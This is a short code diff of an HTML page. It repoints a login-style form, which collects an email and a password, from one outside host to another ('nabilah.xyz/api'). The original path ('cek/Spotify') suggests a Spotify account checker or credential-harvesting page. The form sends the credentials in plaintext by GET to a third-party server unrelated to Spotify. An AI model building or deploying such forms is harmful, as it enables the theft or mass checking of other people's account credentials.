@@ -20,7 +20,7 @@
 <html>
    <body>
    
-      <form action = "http://www.sbsseh.com/cek/Spotify/api/" method = "GET">
+      <form action = "http://nabilah.xyz/api" method = "GET">
             Email: <input type = "name" name = "email" />
 <br>
          Password: <input type = "name" name = "password" />
